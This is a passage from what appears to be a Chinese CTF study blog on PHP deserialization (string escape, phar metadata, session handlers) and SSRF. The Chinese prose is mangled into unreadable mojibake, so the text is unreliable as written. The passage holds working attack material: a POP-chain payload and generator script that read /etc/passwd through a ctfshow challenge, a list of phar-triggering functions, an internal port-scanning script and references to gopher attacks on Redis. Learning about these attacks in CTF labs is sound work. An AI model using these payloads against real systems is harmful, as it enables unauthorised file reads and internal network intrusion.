ä¸ºè¿™é‡Œé•¿åº¦ä¸º8,å®ƒååºåˆ—åŒ–çš„æ—¶å€™,ä¼šä»åé¢ç¬¬ä¸€ä¸ªåŒå¼•å·å¼€å§‹,è¯»å–6ä¸ªå­—ç¬¦ä½œä¸ºmçš„å€¼,å³ä½¿æœ‰åŒå¼•å·,ä¹Ÿä¸èƒ½é—­åˆ\nè¿™é‡Œåºåˆ—åŒ–åè¿›è¡Œäº†ä¸€æ¬¡è¿‡æ»¤,å°†systemè¿‡æ»¤ä¸ºäº†ctfshow,æœ€ååºåˆ—åŒ–çš„ç»“æœå°±æˆäº†\nO:8:&quot;backdoor&quot;:2:&#123;s:1:&quot;m&quot;;s:6:&quot;ctfshow&quot;;&quot;;s:1:&quot;c&quot;;s:2:&quot;ls&quot;;&#125;\n\nè¿˜æ˜¯ä»6åé¢è¯»å–6ä¸ªå­—ç¬¦,ä¼šè¯»å–åˆ°ctsho,ç”±äºæ²¡æœ‰é—­åˆ,å°±ååºåˆ—åŒ–å¤±è´¥äº†,æ‰€ä»¥è¿™æ—¶å€™,æˆ‘ä»¬å°±é€ƒå‡ºäº†1ä¸ªå­—ç¬¦w,å¦‚æœæˆ‘ä»¬å†™ä¸¤ä¸ªsystemè®©ä»–è¿‡æ»¤,å°±ä¼šå¾—åˆ°\nO:8:&quot;backdoor&quot;:2:&#123;s:1:&quot;m&quot;;s:12:&quot;ctfshowctfshow&quot;;&quot;;s:1:&quot;c&quot;;s:2:&quot;ls&quot;;&#125;\n\nè§‚å¯Ÿè§„å¾‹,å¯ä»¥çŸ¥é“:systemå˜æˆctfshowçš„æ—¶å€™,å­—æ¯æ•°é‡ç”±12å˜æˆäº†14,ä½†æ˜¯åºåˆ—åŒ–çš„æ—¶å€™æ²¡æœ‰å˜,æ‰€ä»¥å†™å…¥çš„å­—ç¬¦ä¸²é•¿åº¦ä¾æ—§æ—¶12\né‚£ä¹ˆæŒ‰ç…§ä»¥å‰çš„12ä¸ªé•¿åº¦è¿›è¡Œè¯»å–,ä¼šæŠŠ2ä¸ªå­—ç¬¦é€ƒé€¸å‡ºæ¥\nå¦‚æœè¿™ä¸¤ä¸ªå­—ç¬¦åˆšå¥½æ˜¯åŒå¼•å·,åˆ†å·,å°±å®Œæ•´çš„é—­åˆäº†å±æ€§\nè¿™é‡Œæˆ‘ä»¬ç”¨3ä¸ªsystemå°±å¯ä»¥é€ƒé€¸å‡º3ä¸ªå­—ç¬¦ï¼Œæˆ‘ä»¬ç”¨&quot;;&#125;æ¥ç»“æŸååºåˆ—åŒ–è¯»å–\n$b-&gt;m=&#39;systemsystemsystem&quot;;&#125;&#39;;æ›¿æ¢åå¾—åˆ°O:8:&quot;backdoor&quot;:2:&#123;s:1:&quot;m&quot;;s:21:&quot;ctfshowctfshowctfshow&quot;;&#125;&quot;;s:1:&quot;c&quot;;s:2:&quot;ls&quot;;&#125;\nå¯ä»¥çœ‹åˆ°æ‰”æ‰äº†cè¿™ä¸ªå±æ€§çš„å€¼,ç»§ç»­å¢åŠ systemçš„æ•°é‡å°±å¯ä»¥æ³¨å…¥æˆ‘ä»¬æƒ³è¦çš„å±æ€§\nç¬¬ä¸‰èŠ‚ pharçš„ååºåˆ—åŒ–0x6 ä»€ä¹ˆæ˜¯pharpharæ˜¯ä¸€ç±»æ–‡ä»¶çš„åç¼€åç§°ï¼Œä¹Ÿæ˜¯phpåè®®çš„ä¸€ç§\npharå¯ä»¥å°†å¤šä¸ªphpæ–‡ä»¶åˆå¹¶åˆ°ä¸€ä¸ªç‹¬ç«‹çš„å‹ç¼©åŒ…ï¼Œç›¸å¯¹ç‹¬ç«‹ï¼Œä¸ç”¨è§£å‹åˆ°ç¡¬ç›˜å³å¯è¿è¡Œphpè„šæœ¬ï¼Œæ”¯æŒwebæœåŠ¡å™¨å’Œå‘½ä»¤è¡Œè¿è¡Œ\n\n0x7 åŸºäºpharçš„ååºåˆ—åŒ–pharæ€ä¹ˆç”¨æ­£å¸¸æ¥è¯´æ–‡ä»¶åŒ…å«æ˜¯è¿™æ ·çš„\ninclude &quot;flag.php&quot;;\n\nå¯¹äºä»¥ä¸Šå…¸å‹çš„æ–‡ä»¶åŒ…å«,phpåº•å±‚æ˜¯è¿™ä¹ˆå¤„ç†çš„\ninclude &quot;file://flag.php&quot;;\n\næ‰€ä»¥è¦ä½¿ç”¨pharåŒ…é‡Œçš„æ–‡ä»¶ç›¸åº”çš„ä½¿ç”¨pharåè®®è¿›è¡ŒåŒ…å«\ninclude &quot;phar://com.ctfshow.fileUtil.phar/file.php&quot;;  \n\nå¯ä»¥å‘ç°å¾ˆåƒJavaçš„ä¾èµ–åŒ…\nimport java.util.HashMap;//å¼•å…¥util.jar,ä½¿ç”¨é‡Œé¢çš„hashmapç±»,å…ˆå£°æ˜å‡ºæ¥,åé¢è¦ç”¨\n\næ‰€ä»¥pharå°±å¯ä»¥è®¤ä¸ºæ˜¯ç±»ä¼¼äºJavaçš„ä¸€ç§jaråŒ…, å°†ç›¸å¯¹ç‹¬ç«‹çš„å¤šä¸ªphpæ–‡ä»¶æ‰“åŒ…åœ¨ä¸€èµ·, ç»„æˆä¸€ä¸ªç‹¬ç«‹çš„æ¨¡å—ä¾›å…¶ä»–åº”ç”¨è°ƒç”¨, æˆ–è€…å¹²è„†è‡ªå·±æ‰“åŒ…ä¸ºä¸€ä¸ªç‹¬ç«‹çš„åº”ç”¨, ç±»ä¼¼äºæˆ‘ä»¬bp.jar\npharæ˜¯æ€ä¹ˆç”Ÿæˆçš„é‚£ä¹ˆå¦‚ä½•æ‰“åŒ…ä¸€ä¸ªpharæ–‡ä»¶å‘¢,é¦–å…ˆæ”¹ä¸€ä¸‹é…ç½®æ–‡ä»¶\n\n[Phar]; http://php.net/phar.readonlyphar.readonly = Off\n\n\nç„¶åæˆ‘ä»¬è‡ªå·±ç€æ‰‹å†™ä¸€ä¸‹\n//index.php&lt;?php$phar = new Phar(&#x27;flag.phar&#x27;);//pharå·²ç»æ˜¯ä¸ªå¯¹è±¡ï¼Œç„¶åè°ƒç”¨æ–¹æ³•$phar-&gt;buildFromDirectory(dirname(__FILE__).&#x27;/project&#x27;);//public PharData::buildFromDirectory(string $directory)//dirname() å‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•åç§°éƒ¨åˆ†ã€‚$phar-&gt;setStub($phar-&gt; createDefalutStub(&#x27;index.php&#x27;));//final public static Phar::createDefaultStub(?string $index = null, ?string $webIndex = null)\n\nç„¶åæˆ‘ä»¬éœ€è¦æ–°å»ºä¸€ä¸ªprojectç›®å½•, é‡Œè¾¹æ”¾ä¸Šæˆ‘ä»¬è¦æ‰“åŒ…çš„æ–‡ä»¶/project/index.php\n//index.php&lt;?php$flag=&quot;flag&#123;i am in phar&#125;&quot;;echo $flag;\n\nç„¶åæˆ‘ä»¬æ‰§è¡Œä¸€ä¸‹ç¬¬ä¸€ä¸ªindex.php, ä¼šå‘ç°åœ¨æœ¬åœ°å·²ç»ç”Ÿæˆäº†ä¸€ä¸ªflag.phar\nå†å†™ä¸€ä¸ªinclude.phpæ¥è¯»å–æˆ‘ä»¬çš„pharæ–‡ä»¶\n//include.php&lt;?phpinclude &quot;./flag.phar&quot;;\n\næœ€ç»ˆæˆ‘ä»¬æ‰§è¡Œä¸€ä¸‹include.php, å°±å¯ä»¥è¯»å–åˆ°flagå†…å®¹\n\næˆ‘ä»¬åœ¨åŒ…å«çš„æ—¶å€™ä¹Ÿå¯ä»¥ä¸åŠ pharåç¼€, å› ä¸ºphpæ–‡ä»¶æ²¡æœ‰åç¼€ä¹Ÿæ˜¯èƒ½è¯»å–çš„, like this\npharæ˜¯æ€ä¹ˆååºåˆ—åŒ–çš„\næ¯”æ–¹è¯´è¿™é‡Œæœ‰ä¸€ä¸ªé¢˜ç›®\næ–‡ä»¶ä¸Šä¼ ï¼Œ ä½†æ˜¯ä¸è®©ä¸Šä¼ phpã€iniã€htaccessï¼ˆé»‘åå•ï¼‰å°±å¯ä»¥å°è¯•ä¸Šä¼ pharæ–‡ä»¶, pharæ–‡ä»¶é‡Œå°±æœ‰å¯èƒ½ç”¨åˆ°äº†file_exists(), å°±å¯ä»¥åˆ©ç”¨ååºåˆ—åŒ–\n\npharçš„åº•å±‚åŸç†æ˜¯cä»£ç , è¿™é‡Œä¸å†ç»†çœ‹\nå½“ä½¿ç”¨phar::getMetadataæ–¹æ³•æ—¶, ä¼šè¿›è¡Œååºåˆ—åŒ–, æˆ‘ä»¬æœ¬åœ°æµ‹è¯•ä¸€ä¸‹\n//index.php&lt;?phpclass hack&#123;    public function __destruct()    &#123;        echo &quot;hack class destruct&quot;;    &#125;&#125;$h = new hack();//æ‰§è¡Œææ„$phar = new Phar(&#x27;flag.phar&#x27;);$phar-&gt; buildFromDirectory(dirname(__FILE__).&#x27;/project&#x27;);$phar-&gt; setMetadata($h);$phar-&gt; setStub($phar-&gt; createDefaultStub(&#x27;flag.php&#x27;,&#x27;index.php&#x27;));\n\næˆ‘ä»¬æ‰“å¼€pharæ–‡ä»¶å¯ä»¥å‘ç°, å‡ºç°äº†åºåˆ—åŒ–çš„strings\næ‰§è¡Œä¹‹å, å‘ç°æœ¬åœ°ç”Ÿæˆäº†flag.phar, ç„¶åå°è¯•getMetadata, çœ‹çœ‹èƒ½å¦ååºåˆ—åŒ–hackç±»\n//test.php&lt;?phpclass hack&#123;    public function __destruct()    &#123;        echo &quot;hack class destruct&quot;;    &#125;&#125;$phar = new Phar(&#x27;flag.phar&#x27;);$phar-&gt; getMetadata();\n\n\nå¯ä»¥å‘ç°æ—¶æˆåŠŸååºåˆ—åŒ–hackç±»\né‚£ä¹ˆæœ‰æ²¡æœ‰å¯ä»¥è‡ªåŠ¨ååºåˆ—åŒ–çš„æ–¹æ³•å‘¢, å½“ç„¶æœ‰, é€šè¿‡å°è¯•, æˆ‘ä»¬å‘ç°includeåè®®å’Œpharåè®®éƒ½å¯ä»¥ååºåˆ—åŒ–\n//include.php&lt;?phpclass hack&#123;    public function __destruct()    &#123;        echo &quot;hack class destruct&quot;;    &#125;&#125;file_exists(&#x27;phar://flag.phar&#x27;);//include &#x27;flag.phar&#x27;;//è¿™é‡Œåœ°å€å¯ä»¥ç²¾ç¡®åˆ°/flag.phar/flag.php, ä¹Ÿå¯ä»¥åªå†™åˆ°/flag.phar, å› ä¸ºåœ¨index.phpé‡Œç”¨åˆ°äº†createDefaultStubç¼ºçœæ–¹æ³•\n\n\n\né‚£ä¹ˆä¸ºä»€ä¹ˆè¿™ä¸ªåè®®å°±å¯ä»¥ååºåˆ—åŒ–å‘¢, æˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹phpçš„æºç , å…·ä½“å¯ä»¥çœ‹è¿™é‡Œçš„1874è¡Œ\nèƒ½ä½¿ç”¨pharä¼ªåè®®çš„åœ°æ–¹,å°±èƒ½è‡ªåŠ¨ååºåˆ—åŒ–metaDataé‡Œé¢çš„æ•°æ®\nå…·ä½“å“ªäº›å‡½æ•°å¯ä»¥ç”¨pharåè®®è¿™é‡Œåšä¸€ä¸ªæ±‡æ€», å¯ä»¥è¯´æ˜¯æ¯”è¾ƒå…¨é¢çš„\n\n\n\nfileatime\nfilectime\nfile_exists\nfile_get_contents\nfile_put_contents\n\n\n\nfile\nfilegroup\nfopen\nfileinode\nfilemtime\n\n\nfileowner\nfileperms\nfstat\nfseek\nis_dir\n\n\nis_link\nis_readable\nis_writeable\nis_writable\ninclude\n\n\ninclude_once\nopendir\nparse_ini_file\nrmdir\nrequire\n\n\nrequire_once\nreadfile\nstat\nunlink\nmkdir\n\n\ncopy\nscandir\nfilesize\nhighlight_file\nnew DirectoryIterator\n\n\nä¸¤ç§æƒ…å†µä¸‹pharèƒ½å¤Ÿåˆ©ç”¨\n\nèƒ½å¤Ÿæ§åˆ¶ä¸Šä¼ æˆ–è€…å†™å…¥pharæ–‡ä»¶çš„æƒ…å†µä¸‹. æ²¡æœ‰æ¶æ„ç±», ä½†æ˜¯å¯ä»¥åŒ…å«. å°±ä¼šæ‰§è¡Œpharé‡Œé¢æ‰“åŒ…çš„phpæ–‡ä»¶\næœ‰æ¶æ„ç±», æ²¡æœ‰åŒ…å«, ä½†æ˜¯æœ‰æ–‡ä»¶æ“ä½œå‡½æ•°, å¯ä»¥æ§åˆ¶pharåè®®å¤´. å¯ä»¥è‡ªåŠ¨ååºåˆ—åŒ–é‡Œé¢çš„metaDataæ•°æ®, é…åˆææ„æ–¹æ³•, å¯èƒ½é€ æˆæ¼æ´\n\næ€»ç»“\npharä¸­, ä½¿ç”¨setmetaDataå‡½æ•°å¯ä»¥ä¿å­˜ä»»æ„å¯ååºåˆ—åŒ–çš„å˜é‡ä»¥åŠç±»å®ä¾‹\næ–‡ä»¶æ“ä½œå‡½æ•°ä¸­, åªè¦èƒ½æ§åˆ¶åè®®å¤´, å‡å¯è‡ªåŠ¨ååºåˆ—åŒ–metaDataçš„æ•°æ®\næ–‡ä»¶åŒ…å«çš„æƒ…å†µä¸‹, å¯ä»¥ç›´æ¥æ‰§è¡Œé‡Œé¢çš„phpæ–‡ä»¶ä¸­çš„phpä»£ç \n\nç¬¬å››èŠ‚ sessionçš„ååºåˆ—åŒ–0x8 PHPä¸­çš„sessionæœºåˆ¶åœ¨php.iniæœ‰ä»¥ä¸‹å‡ ä¸ªé»˜è®¤é€‰é¡¹\nsession.upload_progress.enabled = On//è¡¨ç¤ºupload_progressåŠŸèƒ½å¼€å¯, ä¹Ÿæ„å‘³ç€å½“æµè§ˆå™¨å‘æœåŠ¡å™¨ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶æ—¶, phpå°†ä¼šæŠŠæ­¤æ¬¡æ–‡ä»¶ä¸Šä¼ çš„è¯¦ç»†ä¿¡æ¯(å¦‚ä¸Šä¼ æ—¶é—´/ä¸Šä¼ è¿›åº¦ç­‰)å­˜å‚¨åœ¨sessionä¸­;session.upload_progress.cleanup = On//è¡¨ç¤ºå½“æ–‡ä»¶ä¸Šä¼ ç»“æŸå, PHPå°†ä¼šç«‹å³æ¸…ç©ºå¯¹åº”çš„sessionæ–‡ä»¶ä¸­çš„å†…å®¹, è¿™ä¸ªé€‰é¡¹éå¸¸é‡è¦;å¦‚æœå¼€å¯è¡¨ç¤ºå¯èƒ½éœ€è¦ç«äº‰, å¦‚æœä¸å¼€å¯å°±ä¸éœ€è¦ç«äº‰session.upload_progress.prefix = &quot;upload_progress_&quot;//prefix+nameå°†è¡¨ç¤ºä¸ºsessionä¸­çš„é”®åsession.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;//å½“nameå‡ºç°åœ¨è¡¨å•ä¸­, PHPå°†ä¼šæŠ¥å‘Šä¸Šä¼ è¿›åº¦, æœ€å¤§å¥½å¤„æ˜¯ å®ƒçš„å€¼å¯æ§session.upload_progress.freq =  &quot;1%&quot;session.upload_progress.min_freq = &quot;1&quot;\n\nè¿™é‡Œæˆ‘ä»¬åªéœ€è¦äº†è§£å‰å››ä¸ªé…ç½®é€‰é¡¹å³å¯\n0x9 sessionå¤„ç†handlerå¼•èµ·çš„å®‰å…¨é—®é¢˜è¿™é‡Œæˆ‘ä»¬å†™ä¸¤æ®µPHPä»£ç æ¥æœ¬åœ°å®éªŒä¸€ä¸‹\n//index.php&lt;?phpsession_start();//ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);class User&#123;    public $name;&#125;$u = new User();$u-&gt;name=&#x27;charmersix&#x27;;$_SESSION[&#x27;user&#x27;]=$u;?&gt;\n\né¦–å…ˆæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹æœ¬åœ°session.serialize_handlerçš„ä¸åŒæœ‰ä»€ä¹ˆå½±å“, è¿™é‡Œæˆ‘ä»¬å†å†™ä¸€ä¸ªphpinfo\n//phpinfo.php&lt;?phpphpinfo();?&gt;\n\n\nå¯ä»¥çœ‹åˆ°åŸå§‹çš„æ˜¯php, è¿™é‡Œæˆ‘ä»¬è·å–ä¸€ä¸‹sessionè¯•è¯•, æˆ‘ä»¬å¯ä»¥åœ¨æœ¬åœ°çœ‹åˆ°sessionå†…å®¹\nç„¶åæˆ‘ä»¬æ¢ä¸€ä¸ªhandler\næ¥åˆ°é…ç½®æ–‡ä»¶ä¿®æ”¹ä¸€ä¸‹\nå¯ä»¥å‘ç°æ˜æ˜¾çš„ä¸åŒ\nini: session.serialize_handler = phpsession: user|O:4:&quot;User&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;Charmersix&quot;;&#125;ini:  session.serialize_handler = php_serializesession: a:1:&#123;s:4:&quot;user&quot;;O:4:&quot;User&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;Charmersix&quot;;&#125;&#125;\n\nå¦‚æœæˆ‘ä»¬å­˜å‚¨çš„æ˜¯php_serializeå½¢å¼, ç„¶åå†ç”¨phpè¿™ç§å½¢å¼å»è¯»å–, å°±ä¼šå‡ºç°ä¸€ä¸ªååºåˆ—åŒ–çš„æƒ…å†µ.\næ¯”å¦‚è¿™æ ·\n|O:4:&quot;User&quot;:1:&#123;s:4:&quot;name&quot;;s:10:&quot;Charmersix&quot;;&#125;\n\nè¿™æ ·å°±å¯ä»¥æŠŠ|åé¢çš„ååºåˆ—åŒ–\nè¿™é‡Œæˆ‘ä»¬åšä¸€ä¸ªé¢˜ç›®è¯•è¯•, ç”±äºè¿™ä¸ªé¢˜ç›®æ›¾ç»å‡ºç°è¿‡ctfshowå¹³å°çš„å¹´åˆæŒ‘æˆ˜, æ‰€ä»¥æ˜¯å¯ä»¥å…è´¹å‡ºç°çš„, åˆ«çš„ä¸€äº›ctfshowä¼šå‘˜é¢˜ç›®ç”±äºæ‹…å¿ƒä¾µæƒ, æ‰€ä»¥é¢˜ç›®æºç å°±å°½é‡ä¸ä¼šå‡ºç°åœ¨æˆ‘çš„æ–‡ç« é‡Œ\n//index.php&lt;?phpinclude(&quot;class.php&quot;);error_reporting(0);highlight_file(__FILE__);ini_set(&quot;session.serialize_handler&quot;, &quot;php&quot;);session_start();if (isset($_GET[&#x27;phpinfo&#x27;]))&#123;    phpinfo();&#125;if (isset($_GET[&#x27;source&#x27;]))&#123;    highlight_file(&quot;class.php&quot;);&#125;$happy=new Happy();$happy();?&gt;\n\n//class.php&lt;?php    class Happy &#123;        public $happy;        function __construct()&#123;                $this-&gt;happy=&quot;Happy_New_Year!!!&quot;;        &#125;        function __destruct()&#123;                $this-&gt;happy-&gt;happy;        &#125;        public function __call($funName, $arguments)&#123;                die($this-&gt;happy-&gt;$funName);        &#125;        public function __set($key,$value)        &#123;            $this-&gt;happy-&gt;$key = $value;        &#125;        public function __invoke()        &#123;            echo $this-&gt;happy;        &#125;    &#125;    class _New_&#123;        public $daniu;        public $robot;        public $notrobot;        private $_New_;        function __construct()&#123;                $this-&gt;daniu=&quot;I&#x27;m daniu.&quot;;                $this-&gt;robot=&quot;I&#x27;m robot.&quot;;                $this-&gt;notrobot=&quot;I&#x27;m not a robot.&quot;;        &#125;        public function __call($funName, $arguments)&#123;                echo $this-&gt;daniu.$funName.&quot;not exists!!!&quot;;        &#125;        public function __invoke()        &#123;            echo $this-&gt;daniu;            $this-&gt;daniu=$this-&gt;robot;            echo $this-&gt;daniu;        &#125;        public function __toString()        &#123;            $robot=$this-&gt;robot;            $this-&gt;daniu-&gt;$robot=$this-&gt;notrobot;            return (string)$this-&gt;daniu;        &#125;        public function __get($key)&#123;               echo $this-&gt;daniu.$key.&quot;not exists!!!&quot;;        &#125; &#125;    class Year&#123;        public $zodiac;         public function __invoke()        &#123;            echo &quot;happy &quot;.$this-&gt;zodiac.&quot; year!&quot;;        &#125;         function __construct()&#123;                $this-&gt;zodiac=&quot;Hu&quot;;        &#125;        public function __toString()        &#123;                $this-&gt;show();        &#125;        public function __set($key,$value)#3        &#123;            $this-&gt;$key = $value;        &#125;        public function show()&#123;            die(file_get_contents($this-&gt;zodiac));        &#125;        public function __wakeup()        &#123;            $this-&gt;zodiac = &#x27;hu&#x27;;        &#125;    &#125;?&gt;\n\nè¿™é‡Œç”±äºæœ¬äººæ¯”è¾ƒèœå°±å‚è€ƒä¸€ä¸‹å®˜æ–¹çš„wp\næ€è·¯:\n1.åˆ©ç”¨happyç±»çš„ææ„æ–¹æ³•2.è¯»å–happyå±æ€§çš„happyå±æ€§, ä¼šè°ƒç”¨happyå±æ€§çš„__getæ–¹æ³•    æ‰€ä»¥happyå±æ€§å¿…é¡»ä¸ºnewçš„å®ä¾‹3.__getæ–¹æ³•ä¼šè§¦å‘æŸä¸ªå¯¹è±¡çš„__toStringæ–¹æ³•4.__toStringæ–¹æ³•è§¦å‘Yearç±»çš„showæ–¹æ³•\n\nè¿™é‡Œå¯ä»¥å‘ç°popé“¾:\nHappy:__destruct()=&gt;_New_:__get()=&gt;_New_:__toString()=&gt;Year:__toString()=&gt;Year:Show()\n\nç„¶åæˆ‘ä»¬é€šè¿‡postä¼ ä¸€ä¸‹payload, æ„é€ ä¸Šä¼ è¡¨å•\n&lt;form action=&quot;url&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot;&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;    &lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;\n\næ„é€ exp.php\n&lt;?php    class Happy &#123;        public $happy;    &#125;    class _New_&#123;        public $daniu;        public $robot;        public $notrobot; &#125;    class Year&#123;        public $zodiac;    &#125;$a=new Happy();$a-&gt;happy=new _New_();$a-&gt;happy-&gt;daniu=new _New_();$a-&gt;happy-&gt;daniu-&gt;daniu=new Year();$a-&gt;happy-&gt;daniu-&gt;robot=&quot;zodiac&quot;;$a-&gt;happy-&gt;daniu-&gt;notrobot=&quot;/etc/passwd&quot;;echo serialize($a);?&gt;\n\n&lt;?phpinclude &quot;class.php&quot;;//$data = $_POST[&#x27;data&#x27;];//unserialize($data);$h = new Happy();$h-&gt;happy = new _New_();$h-&gt;happy-&gt;daniu = new _New_();$h-&gt;happy-&gt;daniu-&gt;daniu = new Year();$h-&gt;happy-&gt;daniu-&gt;robot = &quot;zodiac&quot;;$h-&gt;happy-&gt;daniu-&gt;notrobot = &#x27;/etc/passwd&#x27;echo urlencode(serialize($h));\n\nç”Ÿæˆpayload\nO:5:&quot;Happy&quot;:1:&#123;s:5:&quot;happy&quot;;O:5:&quot;_New_&quot;:3:&#123;s:5:&quot;daniu&quot;;O:5:&quot;_New_&quot;:3:&#123;s:5:&quot;daniu&quot;;O:4:&quot;Year&quot;:1:&#123;s:6:&quot;zodiac&quot;;N;&#125;s:5:&quot;robot&quot;;s:6:&quot;zodiac&quot;;s:8:&quot;notrobot&quot;;s:11:&quot;/etc/passwd&quot;;&#125;s:5:&quot;robot&quot;;N;s:8:&quot;notrobot&quot;;N;&#125;&#125;\n\nè¿™é‡Œæˆ‘ä»¬éœ€è¦åœ¨payloadå‰åŠ ä¸Š|ä»¥åŠç”¨\\æ¥è½¬ä¹‰&quot;\næœ€ç»ˆpayload\n|O:5:\\&quot;Happy\\&quot;:1:&#123;s:5:\\&quot;happy\\&quot;;O:5:\\&quot;_New_\\&quot;:3:&#123;s:5:\\&quot;daniu\\&quot;;O:5:\\&quot;_New_\\&quot;:3:&#123;s:5:\\&quot;daniu\\&quot;;O:4:\\&quot;Year\\&quot;:1:&#123;s:6:\\&quot;zodiac\\&quot;;N;&#125;s:5:\\&quot;robot\\&quot;;s:6:\\&quot;zodiac\\&quot;;s:8:\\&quot;notrobot\\&quot;;s:11:\\&quot;/etc/passwd\\&quot;;&#125;s:5:\\&quot;robot\\&quot;;N;s:8:\\&quot;notrobot\\&quot;;N;&#125;&#125;\n\nå‘åŒ…, ä»¬ä¼šå‘ç°ä»–è¿™é‡Œæœ‰ä¸€ä¸ª\næ‰€ä»¥æˆ‘ä»¬éœ€è¦æŠŠcookieè¡¥ä¸Š, æˆåŠŸ\n","tags":["Web","Study","unserialize"]},{"title":"Web_7_SSRF/JWT/XXE","url":"/2022/10/30/web_7_ssrf/","content":"ç¬¬ä¸€èŠ‚ SSRFçš„æ¼æ´åˆ©ç”¨0x1 ssrfåŸç†è§£æä»€ä¹ˆæ˜¯ssrf\næœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼Œæ”»å‡»è€…å‘æœåŠ¡ç«¯å‘é€åŒ…å«æ¶æ„urlé“¾æ¥çš„è¯·æ±‚ã€‚ssrfå¸¸è¢«ç”¨äºæ¢æµ‹æ”»å‡»è€…æ— æ³•è®¿é—®çš„ç½‘ç»œåŒºåŸŸï¼Œæ¯”å¦‚å†…ç½‘æˆ–æ˜¯é˜²ç«å¢™è®¿é—®é™åˆ¶çš„ä¸»æœºã€‚\n\næ§åˆ¶æœåŠ¡å™¨ä½¿ç”¨æŒ‡å®šçš„åè®®(å¦‚httpåè®®,fileåè®®)\nssrfåŸç†ssrfæ¼æ´æ”»å‡»çš„ç›®æ ‡ä¸»æœºæ˜¯ä»å¤–ç½‘æ— æ³•ç›´æ¥è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿ\næœåŠ¡ç«¯æä¾›äº†ä»å¤–éƒ¨æœåŠ¡è·å–æ•°æ®çš„åŠŸèƒ½ï¼Œä½†æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€ã€åè®®ç­‰ä¸»è¦å‚æ•°è¿›è¡Œè¿‡æ»¤å’Œé™åˆ¶ï¼Œä»è€Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥è‡ªç”±æ„é€ å‚æ•°ï¼Œå‘èµ·æ¶æ„è¯·æ±‚\næ­£å¸¸è®¿é—®é€»è¾‘å¦‚ä¸‹å›¾\n\nå¯èƒ½äº§ç”Ÿssrfæ¼æ´çš„å‡½æ•°æœ‰\nfile_get_content() ã€fsockopen() ã€curl_exec()\n\nurlç»“æ„urlç»“æ„éµå¾ªRFC1738æ ‡å‡†ï¼ŒåŸºæœ¬ç»“æ„å¦‚ä¸‹  \n\n0x2 ssrfæ¼æ´åˆ©ç”¨ä»»æ„æ–‡ä»¶è¯»å–fileåè®®è¯»å–æ–‡ä»¶,ä½†æ˜¯å‰ææ˜¯çŸ¥é“æ–‡ä»¶å\nå†…ç½‘èµ„æºæ¢æµ‹åˆ©ç”¨æ§åˆ¶çš„hostå­—æ®µæ¥æ‰«æå†…ç½‘å­˜æ´»çš„ä¸»æœº\nç›‘å¬åˆ†ä¸‰é’Ÿ\n\n127.0.0.1 åªå…è®¸æœ¬åœ°è®¿é—®\n0.0.0.0 å…è®¸ä»»æ„åœ°å€è®¿é—®\n192.168.233.233 åªå…è®¸ç‰¹å®šIPè®¿é—®\n\nè¿™é‡Œå¯ä»¥å†™ä¸€ä¸ªè„šæœ¬å¸®æˆ‘ä»¬æ¢æµ‹å†…ç½‘ç½‘ç»œç«¯å£\nimport requestsurl = &quot;é¶æœº&quot;ports = [80,443,8080,80000,9000,21,3306,6379,8088]for p in ports:  data = &#123;    &quot;url&quot;:&quot;http://127.0.0.1:&#123;&#125;&quot;.format(p)  &#125;  response = requests.post(url=url,data=data)  if response.text != &quot;&quot;:    print(&quot;port: &#123;&#125; is open&quot;.format(p))  else:    print(&quot;port:&#123;&#125; is close&quot;.format(p))\n\ngopheråè®®æ‰©å±•æ”»å‡»é¢\nGopheræ˜¯Internetä¸Šéå¸¸æœ‰åçš„ä¿¡æ¯æŸ¥æ‰¾ç³»ç»Ÿ, å®ƒå°†Internetä¸Šçš„æ–‡ä»¶ç»„ç»‡æˆæŸç§ç´¢å¼•, å¾ˆæ–¹ä¾¿åœ°å°†ç”¨æˆ·ä»Internetçš„ä¸€å¤„å¸¦åˆ°å¦ä¸€å¤„. åœ¨wwwå‡ºç°ä¹‹å‰, Gopheræ˜¯Internetä¸Šæœ€ä¸»è¦çš„ä¿¡æ¯æ£€ç´¢å·¥å…·, Gopherç«™ç‚¹ä¹Ÿæ˜¯æœ€ä¸»è¦çš„ç«™ç‚¹, ä½¿ç”¨tcp 70ç«¯å£. ä½†åœ¨wwwå‡ºç°å, Gopherå¤±å»äº†æ˜”æ—¥çš„è¾‰ç…Œ.\n\ngopher://è´Ÿè´£è½¬å‘çš„ä¸€ä¸ªåè®®\næ”»å‡»redisçš„6379ç«¯å£redisæ˜¯ä¸€ä¸ªå¸¸ç”¨çš„ç¼“å­˜éƒ¨ä»¶.ä¸€èˆ¬è¿è¡Œåœ¨å†…ç½‘ï¼Œä½¿ç”¨è€…å¤§å¤šå°†å…¶ç»‘å®šåœ¨127.0.0.1:6397åœ°å€,ä¸”ä¸€èˆ¬ä¸ºç©ºå‘½ä»¤\nredisä¸€æ¡å‘½ä»¤æ‰§è¡Œä¸€ä¸ªè¡Œä¸º,ä¸€æ¡æ˜¯é”™çš„,ä¸‹ä¸€æ¡ä¼šç»§ç»­æ‰§è¡Œ\nå¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶æŠ¥æ–‡çš„ä»»æ„ä¸€è¡Œ,å°±å¯ä»¥å®ç°æ”»å‡».\nè¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨Gopheruså·¥å…·ç”Ÿæˆgopheråè®®æ‰“ä¸€ä¸‹,è¿™é‡Œè¦æ³¨æ„ä¸€ä¸‹,åœ¨ä½¿ç”¨Gopherusæ—¶è¦è®°å¾—äºŒæ¬¡urlç¼–ç \n\n\n\n\né—®é¢˜æ¥äº†,è¿™é‡Œä¸ºä»€ä¹ˆè¦è¿›è¡ŒäºŒæ¬¡ç¼–ç å‘¢?\n\nå› 